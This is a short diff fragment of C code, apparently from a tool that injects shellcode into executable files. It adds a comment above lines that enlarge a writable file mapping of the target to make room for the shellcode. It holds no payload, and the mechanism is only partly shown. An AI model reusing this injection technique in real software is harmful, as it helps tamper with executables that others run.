@@ -177,6 +177,7 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
         return 2;
     }
 
+    // Create new space for the shellcode
     int fileAlignment = getFileAlignment(_CreateFileMappingA, _MapViewOfFile, _UnmapViewOfFile, _CloseHandle, target);
     HANDLE targetMapping = _CreateFileMappingA(
         target, NULL, PAGE_READWRITE, 0, MEM_ALIGN(_GetFileSize(target, NULL) + shellcodeSize, fileAlignment), NULL);
